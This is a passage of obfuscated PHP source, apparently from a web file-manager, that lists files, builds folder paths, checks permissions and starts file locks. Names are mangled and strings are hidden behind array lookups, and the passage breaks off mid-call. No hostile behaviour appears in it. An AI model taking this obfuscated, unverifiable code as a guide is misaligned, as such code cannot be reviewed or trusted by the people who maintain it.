$â¦±‘¯ˆ); $İî‚Äí[$¾Ãš[408]][$¾Ãš[460]][$¾Ãš[408]] = $İî‚Äí[$¾Ãš[408]][$¾Ãš[409]]; } } unset($İî‚Äí); } protected function _listAppendFileMeta(&$¥Ó, $¿ó) { $›²ÂĞäÏõ =& $_SERVER[ÀÆ]; $Šã = array_to_keyvalue($¥Ó, $›²ÂĞäÏõ[33], $›²ÂĞäÏõ[461]); $Šã = array_filter(array_unique($Šã)); if (!$Šã) { return; } $ßæã–á¨İÊ¬î = array($›²ÂĞäÏõ[462] => array($›²ÂĞäÏõ[413], $Šã)); $Ô‡¤ = $›²ÂĞäÏõ[463]; $ÇÒ¹í•¨ş = Model($›²ÂĞäÏõ[464])->field($Ô‡¤)->where($ßæã–á¨İÊ¬î)->select(); $ÇÒ¹í•¨ş = array_to_keyvalue($ÇÒ¹í•¨ş, $›²ÂĞäÏõ[461]); $×­ø±ËÀ = Model($›²ÂĞäÏõ[465])->field($›²ÂĞäÏõ[466])->where($ßæã–á¨İÊ¬î)->select(); $×­ø±ËÀ = $×­ø±ËÀ ? $×­ø±ËÀ : array(); $ŸÕ· = array(); foreach ($×­ø±ËÀ as $‚) { if (!isset($ŸÕ·[$‚[$›²ÂĞäÏõ[461]]])) { $ŸÕ·[$‚[$›²ÂĞäÏõ[461]]] = array(); } $ŸÕ·[$‚[$›²ÂĞäÏõ[461]]][$‚[$›²ÂĞäÏõ[93]]] = $‚[$›²ÂĞäÏõ[372]]; } foreach ($¥Ó as &$Ö‘°á¦) { $©Œ… ¬ = $Ö‘°á¦[$›²ÂĞäÏõ[461]]; if (!$©Œ… ¬ || !is_array($ÇÒ¹í•¨ş[$©Œ… ¬])) { continue; } $¾“’äÉÔÇÍîÌ = $ÇÒ¹í•¨ş[$©Œ… ¬]; $¾“’äÉÔÇÍîÌ[$›²ÂĞäÏõ[78]] = $Ö‘°á¦[$›²ÂĞäÏõ[78]]; $¾“’äÉÔÇÍîÌ[$›²ÂĞäÏõ[28]] = $Ö‘°á¦[$›²ÂĞäÏõ[28]]; if (!isset(self::$cacheFileInfo[$›²ÂĞäÏõ[467] . $©Œ… ¬])) { self::$cacheFileInfo[$›²ÂĞäÏõ[467] . $©Œ… ¬] = array_merge(array(), $¾“’äÉÔÇÍîÌ); } unset($ÇÒ¹í•¨ş[$©Œ… ¬][$›²ÂĞäÏõ[76]]); $š¼ = is_array($ŸÕ·[$©Œ… ¬]) ? $ŸÕ·[$©Œ… ¬] : array(); $Ö‘°á¦[$›²ÂĞäÏõ[164]] = array_merge($š¼, $ÇÒ¹í•¨ş[$©Œ… ¬]); if (isset($Ö‘°á¦[$›²ÂĞäÏõ[164]][$›²ÂĞäÏõ[163]])) { $Ö‘°á¦[$›²ÂĞäÏõ[163]] = json_decode($Ö‘°á¦[$›²ÂĞäÏõ[164]][$›²ÂĞäÏõ[163]], !0); unset($Ö‘°á¦[$›²ÂĞäÏõ[164]][$›²ÂĞäÏõ[163]]); } } unset($Ö‘°á¦); } protected function _listAppendSourceInfo(&$ÄøÍâ²ñ, $Ó°¶°·ˆó€Ò) { $àş» =& $_SERVER[ÀÆ]; if (!defined($àş»[468])) { return; } $îû = Model($àş»[469])->listData(); $Ì = Model($àş»[420])->listData(); $â“úË™ËÂ = Model($àş»[410])->listData(); $Ò’ÑÔ†­ = Model($àş»[470])->listSimple(); $ÎŒ = array_to_keyvalue($îû, $àş»[395]); $ƒœª²Ò»‚´ì = array_to_keyvalue_group($Ì, $àş»[76], $àş»[421]); $ô = array_to_keyvalue($â“úË™ËÂ, $àş»[76]); $®˜º = array_to_keyvalue_group($Ò’ÑÔ†­, $àş»[397]); foreach ($ÄøÍâ²ñ as &$ø‡ã£«¸Ù) { $ø‡ã£«¸Ù[$àş»[85]] = array($àş»[471] => 0, $àş»[472] => 0, $àş»[473] => 0); if (isset($ô[$ø‡ã£«¸Ù[$àş»[397]]])) { $ø‡ã£«¸Ù[$àş»[85]][$àş»[474]] = 1; $ø‡ã£«¸Ù[$àş»[85]][$àş»[475]] = $ô[$ø‡ã£«¸Ù[$àş»[397]]][$àş»[28]]; } if (isset($ƒœª²Ò»‚´ì[$ø‡ã£«¸Ù[$àş»[397]]])) { $ø‡ã£«¸Ù[$àş»[85]][$àş»[476]] = array(); foreach ($ƒœª²Ò»‚´ì[$ø‡ã£«¸Ù[$àş»[397]]] as $›·½ÇŠˆ²) { $š”óÊëÀ« = $ÎŒ[$›·½ÇŠˆ²]; $ø‡ã£«¸Ù[$àş»[85]][$àş»[476]][] = array($àş»[477] => $š”óÊëÀ«[$àş»[395]], $àş»[415] => $š”óÊëÀ«[$àş»[28]], $àş»[478] => $š”óÊëÀ«[$àş»[479]]); } } if (isset($®˜º[$ø‡ã£«¸Ù[$àş»[397]]])) { $ø‡ã£«¸Ù[$àş»[85]][$àş»[480]] = array(); foreach ($®˜º[$ø‡ã£«¸Ù[$àş»[397]]] as $ş†ŸÌá) { $ø‡ã£«¸Ù[$àş»[85]][$àş»[480]] = array($àş»[481] => $ş†ŸÌá[$àş»[482]], $àş»[483] => $ş†ŸÌá[$àş»[484]], $àş»[485] => $ş†ŸÌá[$àş»[397]], $àş»[486] => $ş†ŸÌá[$àş»[487]], $àş»[488] => $ş†ŸÌá[$àş»[489]], $àş»[490] => $ş†ŸÌá[$àş»[490]], $àş»[491] => $ş†ŸÌá[$àş»[491]]); } } } unset($ø‡ã£«¸Ù); return $ÄøÍâ²ñ; } protected function _listAppendChildren(&$¸œã, $—éš‰ËÀ©ÜĞ) { $ıİó´¼Ä =& $_SERVER[ÀÆ]; $ìÁ§¼¨Á‹¿ = array(); $ùòô¡ˆ‡ïÀ…– = array($ıİó´¼Ä[203] => 0, $ıİó´¼Ä[204] => 0); foreach ($¸œã as &$÷ıì¹ü“™) { if (!$÷ıì¹ü“™[$ıİó´¼Ä[405]]) { continue; } $ìÁ§¼¨Á‹¿[] = $÷ıì¹ü“™[$ıİó´¼Ä[397]]; } unset($÷ıì¹ü“™); if (!$ìÁ§¼¨Á‹¿) { return; } $šœÆ´‚ = array($ıİó´¼Ä[492] => array($ıİó´¼Ä[7], $ìÁ§¼¨Á‹¿)); $±ÎÊŸ¥ = array($ıİó´¼Ä[492], $ıİó´¼Ä[405], $ıİó´¼Ä[493] => $ıİó´¼Ä[494]); $ ˆ = $this->field($±ÎÊŸ¥)->where($šœÆ´‚)->group($ıİó´¼Ä[495])->select(); $º¯ = array(); foreach ($ ˆ as $µäå) { $›ú¢¹Ø£î¢ = $µäå[$ıİó´¼Ä[492]]; $–ĞşÒ¢»¾í = $µäå[$ıİó´¼Ä[405]] == $ıİó´¼Ä[87] ? $ıİó´¼Ä[204] : $ıİó´¼Ä[203]; if (!isset($º¯[$›ú¢¹Ø£î¢])) { $º¯[$›ú¢¹Ø£î¢] = array($ıİó´¼Ä[203] => 0, $ıİó´¼Ä[204] => 0); } $º¯[$›ú¢¹Ø£î¢][$–ĞşÒ¢»¾í] += $µäå[$ıİó´¼Ä[494]]; } foreach ($¸œã as &$÷ıì¹ü“™) { if (!$÷ıì¹ü“™[$ıİó´¼Ä[405]]) { continue; } $ùÆƒèù  = is_array($º¯[$÷ıì¹ü“™[$ıİó´¼Ä[397]]]) ? $º¯[$÷ıì¹ü“™[$ıİó´¼Ä[397]]] : $ùòô¡ˆ‡ïÀ…–; $÷ıì¹ü“™[$ıİó´¼Ä[204]] = $ùÆƒèù [$ıİó´¼Ä[204]]; $÷ıì¹ü“™[$ıİó´¼Ä[203]] = $ùÆƒèù [$ıİó´¼Ä[203]]; unset($÷ıì¹ü“™[$ıİó´¼Ä[407]]); } unset($÷ıì¹ü“™); } protected function _listAppendAuth(&$´Šì¨«) { $ÚššŸ§¥¨Ï =& $_SERVER[ÀÆ]; if (!defined($ÚššŸ§¥¨Ï[468])) { return; } $Ó»¢ = array(); foreach ($´Šì¨« as $‡ØÀú½‰) { if ($‡ØÀú½‰[$ÚššŸ§¥¨Ï[406]] == self::TYPE_GROUP) { $Ó»¢[] = $‡ØÀú½‰[$ÚššŸ§¥¨Ï[397]]; } } if (!$Ó»¢) { return; } $””¸‚—ù®ñğ = array_to_keyvalue($´Šì¨«, $ÚššŸ§¥¨Ï[397]); $òÒ«ûé = Model($ÚššŸ§¥¨Ï[496])->getSourceList($Ó»¢, $””¸‚—ù®ñğ); foreach ($´Šì¨« as $ïû => &$‡ØÀú½‰) { $‡ØÀú½‰[$ÚššŸ§¥¨Ï[408]] = $òÒ«ûé[$‡ØÀú½‰[$ÚššŸ§¥¨Ï[397]]]; if (!$‡ØÀú½‰[$ÚššŸ§¥¨Ï[408]] && $‡ØÀú½‰[$ÚššŸ§¥¨Ï[406]] == self::TYPE_GROUP) { $‡ØÀú½‰[$ÚššŸ§¥¨Ï[408]] = Action($ÚššŸ§¥¨Ï[497])->pathGroupAuthMake($‡ØÀú½‰[$ÚššŸ§¥¨Ï[498]]); if (!$‡ØÀú½‰[$ÚššŸ§¥¨Ï[408]] && !_get($GLOBALS, $ÚššŸ§¥¨Ï[499])) { $‡ØÀú½‰[$ÚššŸ§¥¨Ï[196]] = !1; $‡ØÀú½‰[$ÚššŸ§¥¨Ï[195]] = !1; } } if ($‡ØÀú½‰[$ÚššŸ§¥¨Ï[408]]) { $‡ØÀú½‰[$ÚššŸ§¥¨Ï[196]] = AuthModel::authCheckEdit($‡ØÀú½‰[$ÚššŸ§¥¨Ï[408]][$ÚššŸ§¥¨Ï[409]]); $‡ØÀú½‰[$ÚššŸ§¥¨Ï[195]] = AuthModel::authCheckView($‡ØÀú½‰[$ÚššŸ§¥¨Ï[408]][$ÚššŸ§¥¨Ï[409]]); } $this->groupPathDisplay($‡ØÀú½‰); } unset($‡ØÀú½‰); } public function _listAppendAuthSecret(&$çïµ´) { $Õş =& $_SERVER[ÀÆ]; if (Model($Õş[427])->get($Õş[500]) != $Õş[87]) { return; } static $ŞÀ = false; if (!$ŞÀ) { $­‘›±¥ = Model($Õş[501]); $ËôÖ©³À± = Model($Õş[502]); $ŞÀ = $ËôÖ©³À±->listData(); $ŞÀ = array_to_keyvalue($ŞÀ, $Õş[397]); $Š®Û¿ğ‰œ ß = json_decode(Model($Õş[427])->get($Õş[503]), !0); $Š®Û¿ğ‰œ ß = array_to_keyvalue($Š®Û¿ğ‰œ ß, $Õş[395]); foreach ($ŞÀ as $ş => $œƒ«¾ô ¥•¿º) { $‰œ‚¿øÁ = $Š®Û¿ğ‰œ ß[$œƒ«¾ô ¥•¿º[$Õş[504]]]; if (!$‰œ‚¿øÁ) { $ËôÖ©³À±->remove($œƒ«¾ô ¥•¿º[$Õş[395]]); unset($ŞÀ[$ş]); continue; } $è = $­‘›±¥->listData($‰œ‚¿øÁ[$Õş[408]]); if (!$è) { $ËôÖ©³À±->remove($œƒ«¾ô ¥•¿º[$Õş[395]]); unset($ŞÀ[$ş]); continue; } $œƒ«¾ô ¥•¿º[$Õş[408]] = $è; $œƒ«¾ô ¥•¿º[$Õş[505]] = $‰œ‚¿øÁ; $œƒ«¾ô ¥•¿º[$Õş[506]] = Model($Õş[507])->getInfoSimpleOuter($œƒ«¾ô ¥•¿º[$Õş[446]]); $ŞÀ[$ş] = $œƒ«¾ô ¥•¿º; } } $±¤ = defined($Õş[508]) ? USER_ID : $Õş[33]; $±ü¸¤çş¿•Ò = array(); $Ã¦ = $this->_listAppendPath($±ü¸¤çş¿•Ò, !0); foreach ($çïµ´ as $ş => &$œƒ«¾ô ¥•¿º) { if (!is_array($œƒ«¾ô ¥•¿º[$Õş[408]])) { continue; } if ($œƒ«¾ô ¥•¿º[$Õş[406]] != $Õş[509]) { continue; } if (isset($ŞÀ[$œƒ«¾ô ¥•¿º[$Õş[397]]])) { $ø = $ŞÀ[$œƒ«¾ô ¥•¿º[$Õş[397]]]; if (!is_array($œƒ«¾ô ¥•¿º[$Õş[459]])) { $œƒ«¾ô ¥•¿º[$Õş[459]] = array(); } $œƒ«¾ô ¥•¿º[$Õş[459]][$Õş[510]] = $ø[$Õş[504]]; $œƒ«¾ô ¥•¿º[$Õş[408]][$Õş[511]] = $ø; $œƒ«¾ô ¥•¿º[$Õş[408]][$Õş[512]] = $œƒ«¾ô ¥•¿º[$Õş[513]]; $œƒ«¾ô ¥•¿º[$Õş[408]][$Õş[514]] = $Õş[87]; if ($ø[$Õş[446]] != $±¤) { $œƒ«¾ô ¥•¿º[$Õş[408]][$Õş[409]] = $œƒ«¾ô ¥•¿º[$Õş[408]][$Õş[409]] & $ø[$Õş[408]][$Õş[408]]; } continue; } $ÓÇäŒƒï¨ = $this->parentLevelArray($œƒ«¾ô ¥•¿º[$Õş[515]]); $©Ü‚İ´„úà‰ë = array_reverse($ÓÇäŒƒï¨); foreach ($©Ü‚İ´„úà‰ë as $Ò¼‚ µø»úÓ‘ => $ÙĞ²) { if (!isset($ŞÀ[$ÙĞ²])) { continue; } $ø = $ŞÀ[$ÙĞ²]; $œƒ«¾ô ¥•¿º[$Õş[408]][$Õş[511]] = $ø; if ($ø[$Õş[446]] != $±¤) { $œƒ«¾ô ¥•¿º[$Õş[408]][$Õş[409]] = $œƒ«¾ô ¥•¿º[$Õş[408]][$Õş[409]] & $ø[$Õş[408]][$Õş[408]]; } $Øü = $Õş[33]; $İ§º´¸“À²À = count($ÓÇäŒƒï¨) - $Ò¼‚ µø»úÓ‘; for ($õŒ = 0; $õŒ < $İ§º´¸“À²À; $õŒ++) { if (!isset($Ã¦[$ÓÇäŒƒï¨[$õŒ]])) { $Øü = $Õş[33]; break; } $Øü = $Øü . rtrim($Ã¦[$ÓÇäŒƒï¨[$õŒ]], $Õş[8]) . $Õş[8]; } $œƒ«¾ô ¥•¿º[$Õş[408]][$Õş[512]] = rtrim($Øü, $Õş[8]) . $Õş[8]; break; } } unset($œƒ«¾ô ¥•¿º); } public function groupPathDisplay(&$«¡ˆ¦×®ƒî) { $’âÆç ‚¼ü =& $_SERVER[ÀÆ]; if ($«¡ˆ¦×®ƒî[$’âÆç ‚¼ü[406]] != self::TYPE_GROUP) { return; } $Ù“ = Model($’âÆç ‚¼ü[516])->getInfo($«¡ˆ¦×®ƒî[$’âÆç ‚¼ü[498]]); $¥† = $this->parentLevelArray($Ù“[$’âÆç ‚¼ü[515]]); $ûäÏ«ÌĞ…Ìô = $’âÆç ‚¼ü[33]; foreach ($¥† as $èŒ) { $‹›â”ÂÊÉ = Model($’âÆç ‚¼ü[516])->getInfo($èŒ); $ûäÏ«ÌĞ…Ìô .= $‹›â”ÂÊÉ[$’âÆç ‚¼ü[85]][$’âÆç ‚¼ü[397]] . $’âÆç ‚¼ü[47]; } $«¡ˆ¦×®ƒî[$’âÆç ‚¼ü[517]] = $Ù“[$’âÆç ‚¼ü[492]]; $«¡ˆ¦×®ƒî[$’âÆç ‚¼ü[518]] = $Ù“[$’âÆç ‚¼ü[515]]; $«¡ˆ¦×®ƒî[$’âÆç ‚¼ü[519]] = $Ù“[$’âÆç ‚¼ü[520]]; $«¡ˆ¦×®ƒî[$’âÆç ‚¼ü[521]] = $ûäÏ«ÌĞ…Ìô . $Ù“[$’âÆç ‚¼ü[85]][$’âÆç ‚¼ü[397]]; } protected function _listAppendPath(&$¨Ç°Éµé‘ÛË, $‚ÚÎ£áĞ = false) { $ĞÌËÕßº =& $_SERVER[ÀÆ]; static $Ÿ°‚ß = array(); $®Ï™¹â’Ö»ñ = array(); $ÖÏ˜¡å­ = array(); if ($‚ÚÎ£áĞ) { return $Ÿ°‚ß; } foreach ($¨Ç°Éµé‘ÛË as &$È‡Ûş¾öŠâ) { $—šÙ = $È‡Ûş¾öŠâ[$ĞÌËÕßº[397]]; if ($È‡Ûş¾öŠâ[$ĞÌËÕßº[405]] == $ĞÌËÕßº[87] && $È‡Ûş¾öŠâ[$ĞÌËÕßº[492]] != 0) { $Ÿ°‚ß[$—šÙ] = $È‡Ûş¾öŠâ[$ĞÌËÕßº[28]]; } if ($È‡Ûş¾öŠâ[$ĞÌËÕßº[405]] == $ĞÌËÕßº[87] && $È‡Ûş¾öŠâ[$ĞÌËÕßº[492]] == 0 && !isset($Ÿ°‚ß[$—šÙ])) { $Ÿ°‚ß[$—šÙ] = $this->_listAppendPathRoot($È‡Ûş¾öŠâ, array()); } if (isset($ÖÏ˜¡å­[$È‡Ûş¾öŠâ[$ĞÌËÕßº[515]]])) { continue; } $ÖÏ˜¡å­[$È‡Ûş¾öŠâ[$ĞÌËÕßº[515]]] = !0; $üŠ = $this->parentLevelArray($È‡Ûş¾öŠâ[$ĞÌËÕßº[515]]); foreach ($üŠ as $Âµ¦ ¡³îÇå => $Š´äà©¨«) { if (isset($Ÿ°‚ß[$Š´äà©¨«])) { continue; } if ($Âµ¦ ¡³îÇå == 0) { $Ÿ°‚ß[$Š´äà©¨«] = $this->_listAppendPathRoot($È‡Ûş¾öŠâ, $üŠ); } if ($Âµ¦ ¡³îÇå != 0) { $®Ï™¹â’Ö»ñ[] = $Š´äà©¨«; } } } unset($È‡Ûş¾öŠâ); $®Ï™¹â’Ö»ñ = array_unique($®Ï™¹â’Ö»ñ); if (count($®Ï™¹â’Ö»ñ) > 0) { $Ø  = array($ĞÌËÕßº[412] => array($ĞÌËÕßº[413], $®Ï™¹â’Ö»ñ)); if (count($®Ï™¹â’Ö»ñ) == 1) { $šš”§»… = $this->sourceInfo($®Ï™¹â’Ö»ñ[0]); $ê‰ºõ·‘ = is_array($šš”§»…) ? array($šš”§»…) : !1; } else { $ê‰ºõ·‘ = $this->field($ĞÌËÕßº[522])->where($Ø )->select(); } if (!$ê‰ºõ·‘) { $ê‰ºõ·‘ = array(); } foreach ($ê‰ºõ·‘ as $‚Óøü) { $Ÿ°‚ß[$‚Óøü[$ĞÌËÕßº[397]]] = $‚Óøü[$ĞÌËÕßº[28]]; } } $‡²Ìå±ÅÊş = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¡öÑÊÁ = array(); foreach ($¨Ç°Éµé‘ÛË as &$È‡Ûş¾öŠâ) { $Ò = $È‡Ûş¾öŠâ[$ĞÌËÕßº[515]]; $ÁÛşŞÇ‘¾ = $ĞÌËÕßº[33]; if (isset($¡öÑÊÁ[$Ò])) { $ÁÛşŞÇ‘¾ = $¡öÑÊÁ[$Ò]; } else { $üŠ = $this->parentLevelArray($È‡Ûş¾öŠâ[$ĞÌËÕßº[515]]); foreach ($üŠ as $Âµ¦ ¡³îÇå => $Š´äà©¨«) { if (isset($Ÿ°‚ß[$Š´äà©¨«])) { $ÁÛşŞÇ‘¾ .= $Ÿ°‚ß[$Š´äà©¨«] . $ĞÌËÕßº[8]; } } $¡öÑÊÁ[$Ò] = $ÁÛşŞÇ‘¾; } $ÁÛşŞÇ‘¾ .= $È‡Ûş¾öŠâ[$ĞÌËÕßº[28]]; if ($È‡Ûş¾öŠâ[$ĞÌËÕßº[405]] == $ĞÌËÕßº[87]) { $ÁÛşŞÇ‘¾ .= $ĞÌËÕßº[8]; } $È‡Ûş¾öŠâ[$ĞÌËÕßº[513]] = str_replace($ĞÌËÕßº[523], $ĞÌËÕßº[8], $ÁÛşŞÇ‘¾); if ($È‡Ûş¾öŠâ[$ĞÌËÕßº[492]] == $ĞÌËÕßº[191]) { $È‡Ûş¾öŠâ[$ĞÌËÕßº[28]] = trim($Ÿ°‚ß[$È‡Ûş¾öŠâ[$ĞÌËÕßº[397]]], $ĞÌËÕßº[8]); $È‡Ûş¾öŠâ[$ĞÌËÕßº[513]] = $È‡Ûş¾öŠâ[$ĞÌËÕßº[28]] . $ĞÌËÕßº[8]; } if (intval($È‡Ûş¾öŠâ[$ĞÌËÕßº[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($È‡Ûş¾öŠâ, $üŠ, $‡²Ìå±ÅÊş); } } unset($È‡Ûş¾öŠâ); return $¨Ç°Éµé‘ÛË; } private function _listAppendPathRecycle(&$öç, $ÜŸ‰Ò˜âê°©½, $®¥ãŠ«í§ÄÏ±) { $ì¿¯†ö¥ =& $_SERVER[ÀÆ]; if (!in_array($®¥ãŠ«í§ÄÏ±, $ÜŸ‰Ò˜âê°©½) && $öç[$ì¿¯†ö¥[397]] != $®¥ãŠ«í§ÄÏ±) { return; } $„³ŒØŠÄ = explode($ì¿¯†ö¥[8], trim($öç[$ì¿¯†ö¥[513]], $ì¿¯†ö¥[8])); $““Í§„ï²ˆé = implode($ì¿¯†ö¥[8], array_slice($„³ŒØŠÄ, 2)); $öç[$ì¿¯†ö¥[513]] = $ì¿¯†ö¥[8] . LNG($ì¿¯†ö¥[524]) . $ì¿¯†ö¥[8] . ltrim($““Í§„ï²ˆé, $ì¿¯†ö¥[8]); $öç[$ì¿¯†ö¥[515]] = $ì¿¯†ö¥[525] . implode($ì¿¯†ö¥[47], array_slice($ÜŸ‰Ò˜âê°©½, 1)) . $ì¿¯†ö¥[47]; if ($öç[$ì¿¯†ö¥[397]] == $®¥ãŠ«í§ÄÏ±) { $öç[$ì¿¯†ö¥[515]] = $ì¿¯†ö¥[525]; $öç[$ì¿¯†ö¥[492]] = $ì¿¯†ö¥[191]; $öç[$ì¿¯†ö¥[28]] = LNG($ì¿¯†ö¥[524]); } $öç[$ì¿¯†ö¥[526]] = $ì¿¯†ö¥[527]; } protected function _listAppendPathRoot(&$Ğ¦±íÖ, $€) { $Ûú…°Ü =& $_SERVER[ÀÆ]; $¢Ü¨şÔ¨ù£ÓŞ = $Ûú…°Ü[33]; if ($Ğ¦±íÖ[$Ûú…°Ü[406]] == self::TYPE_USER) { if (defined($Ûú…°Ü[468]) && $Ğ¦±íÖ[$Ûú…°Ü[498]] == USER_ID) { $¢Ü¨şÔ¨ù£ÓŞ = LNG($Ûú…°Ü[528]); if (!$€) { $Ğ¦±íÖ[$Ûú…°Ü[28]] = $¢Ü¨şÔ¨ù£ÓŞ; } } else { $ò§Á­í = Model($Ûú…°Ü[507])->getInfoSimple($Ğ¦±íÖ[$Ûú…°Ü[498]]); $¢Ü¨şÔ¨ù£ÓŞ = LNG($Ûú…°Ü[529]) . $Ûú…°Ü[160] . $ò§Á­í[$Ûú…°Ü[28]] . $Ûú…°Ü[530]; } } else { if ($Ğ¦±íÖ[$Ûú…°Ü[406]] == self::TYPE_GROUP) { $ò§Á­í = Model($Ûú…°Ü[516])->getInfoSimple($Ğ¦±íÖ[$Ûú…°Ü[498]]); $¢Ü¨şÔ¨ù£ÓŞ = $ò§Á­í[$Ûú…°Ü[28]]; } else { if ($Ğ¦±íÖ[$Ûú…°Ü[406]] == self::TYPE_SYSTEM) { $¢Ü¨şÔ¨ù£ÓŞ = $Ûú…°Ü[531]; } } } $¢Ü¨şÔ¨ù£ÓŞ = $¢Ü¨şÔ¨ù£ÓŞ ? $Ûú…°Ü[8] . $¢Ü¨şÔ¨ù£ÓŞ . $Ûú…°Ü[8] : $Ûú…°Ü[8]; return $¢Ü¨şÔ¨ù£ÓŞ; } protected function _listAppendUser(&$ˆá) { $™•‹‚è€úÜ´Ÿ =& $_SERVER[ÀÆ]; $ÛÓÒûøÁ—ßà = array_to_keyvalue($ˆá, $™•‹‚è€úÜ´Ÿ[33], $™•‹‚è€úÜ´Ÿ[446]); $¡èä»ñúĞ = array_to_keyvalue($ˆá, $™•‹‚è€úÜ´Ÿ[33], $™•‹‚è€úÜ´Ÿ[448]); $™±Î¬È…Å = array_merge($ÛÓÒûøÁ—ßà, $¡èä»ñúĞ); $¶—Ö¨ŞÅ–à = Model($™•‹‚è€úÜ´Ÿ[532])->userListInfo($™±Î¬È…Å); foreach ($ˆá as &$±¯ã‰ùùû¸) { $‚½³Ü = $±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[446]]; $±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[446]] = $¶—Ö¨ŞÅ–à[$‚½³Ü] ? $¶—Ö¨ŞÅ–à[$‚½³Ü] : !1; $‚½³Ü = $±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[448]]; $±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[448]] = $¶—Ö¨ŞÅ–à[$‚½³Ü] ? $¶—Ö¨ŞÅ–à[$‚½³Ü] : !1; if (isset($±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[459]]) && $±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[459]][$™•‹‚è€úÜ´Ÿ[533]]) { $Æ÷àû€şã«ôÕ = $GLOBALS[$™•‹‚è€úÜ´Ÿ[6]][$™•‹‚è€úÜ´Ÿ[88]][$™•‹‚è€úÜ´Ÿ[534]]; if ($±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[459]][$™•‹‚è€úÜ´Ÿ[535]] <= time() - $Æ÷àû€şã«ôÕ) { $this->metaSet($±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[397]], $™•‹‚è€úÜ´Ÿ[533], null); $this->metaSet($±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[397]], $™•‹‚è€úÜ´Ÿ[535], null); unset($±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[459]][$™•‹‚è€úÜ´Ÿ[533]]); continue; } $Ûšû = $±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[459]][$™•‹‚è€úÜ´Ÿ[533]]; $±¯ã‰ùùû¸[$™•‹‚è€úÜ´Ÿ[459]][$™•‹‚è€úÜ´Ÿ[536]] = Model($™•‹‚è€úÜ´Ÿ[532])->getInfoSimpleOuter($Ûšû); } } unset($±¯ã‰ùùû¸); } public function parentLevelArray($¨Ş) { $ÙºĞŸ =& $_SERVER[ÀÆ]; $¨Ş = explode($ÙºĞŸ[47], trim($¨Ş, $ÙºĞŸ[47])); return array_remove_value($¨Ş, $ÙºĞŸ[191]); } public function listAll($Éä¶µ) { $Åœï÷ =& $_SERVER[ÀÆ]; $”Ê˜—Ìª = $this->sourceInfo($Éä¶µ); $–²Ş© = array($Åœï÷[537] => array($Åœï÷[538], $”Ê˜—Ìª[$Åœï÷[515]] . $Éä¶µ . $Åœï÷[539]), $Åœï÷[540] => 0); $¹¸—–Ê = $Åœï÷[541]; $î¨™´® = "\114\105\x46\124\40\x4a\117\111\x4e\40{$this->tablePrefix}\151\x6f\137\146\x69\154\x65\x20\x66\x69\154\145\40\157\156\40\163\x6f\165\162\143\x65\x2e\x66\x69\x6c\x65\x49\x44\40\75\x20\146\x69\154\x65\x2e\146\x69\x6c\145\111\104"; $×”ò = $this->alias($Åœï÷[438])->field($¹¸—–Ê)->where($–²Ş©)->join($î¨™´®)->select(); $this->_listAppendAuth($×”ò); $this->_listAppendUser($×”ò); $this->_listAppendPath($×”ò); $×”ò = array_to_keyvalue($×”ò, $Åœï÷[397]); $åË = "\x2f{$”Ê˜—Ìª[$Åœï÷[28]]}\x2f"; $åË = $åË == $Åœï÷[523] ? $Åœï÷[8] : $åË; $äÚŞ‡ = array(); foreach ($×”ò as $æ«†Ø…è => $»¼Æ­…Ğß) { $Ÿ„Œ = $this->parentLevelArray($»¼Æ­…Ğß[$Åœï÷[515]]); array_shift($Ÿ„Œ); $éİæó²ìş = $åË; for ($ÀÙî£ = 0; $ÀÙî£ < count($Ÿ„Œ); $ÀÙî£++) { $éİæó²ìş .= $×”ò[$Ÿ„Œ[$ÀÙî£]][$Åœï÷[28]] . $Åœï÷[8]; } $éİæó²ìş .= $»¼Æ­…Ğß[$Åœï÷[28]]; if ($»¼Æ­…Ğß[$Åœï÷[405]]) { $éİæó²ìş .= $Åœï÷[8]; } $éİæó²ìş = str_replace($Åœï÷[523], $Åœï÷[8], $éİæó²ìş); $éİæó²ìş = str_replace($Åœï÷[523], $Åœï÷[8], $éİæó²ìş); $Åµşı«Š = array($Åœï÷[416] => str_replace($Åœï÷[523], $Åœï÷[8], $éİæó²ìş), $Åœï÷[542] => intval($»¼Æ­…Ğß[$Åœï÷[405]]), $Åœï÷[85] => $this->pathInfoFilter($»¼Æ­…Ğß)); if (!$»¼Æ­…Ğß[$Åœï÷[405]]) { $Åµşı«Š[$Åœï÷[461]] = $»¼Æ­…Ğß[$Åœï÷[461]]; $Åµşı«Š[$Åœï÷[86]] = $»¼Æ­…Ğß[$Åœï÷[76]]; } $äÚŞ‡[] = $Åµşı«Š; } return $äÚŞ‡; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($İÈ) { $Èû‹Û’¶ =& $_SERVER[ÀÆ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Èû‹Û’¶[543], $İÈ); $â¸ä‚æ = 1; $this->_lockEvent($İÈ, array($Èû‹Û’¶[544], $Èû‹Û’¶[545]), $â¸ä‚æ); $this->_lockParent($İÈ, array($Èû‹Û’¶[545]), $â¸ä‚æ); $this->_lockEvent($İÈ, array($Èû‹Û’¶[546], $Èû‹Û’¶[547]), $â¸ä‚æ); $this->_lockCheckEnd($Èû‹Û’¶[543], $İÈ); } public function lockCopyEnd($‘ñõåöœø‹) { $Îœ—ú¢•ù =& $_SERVER[ÀÆ]; if (!$this->allowLock()) { return; } $Í = 0; $this->_lockEvent($‘ñõåöœø‹, array($Îœ—ú¢•ù[544], $Îœ—ú¢•ù[545]), $Í); $this->_lockParent($‘ñõåöœø‹, array($Îœ—ú¢•ù[545]), $Í); $this->_lockEvent($‘ñõåöœø‹, array($Îœ—ú¢•ù[546], $Îœ—ú¢•ù[547]), $Í); } public function lockWriteStart($™©“çĞÅ, $¿‰÷— = '') { $íı÷ÁóÄ =& $_SERVER[ÀÆ]; if (!$this->allowLock()) { return; } $this->_lockCheck($íı÷ÁóÄ[544], $™©“çĞÅ); $Ûí˜Ë = 1; $this->_lockKey($íı÷ÁóÄ[548] 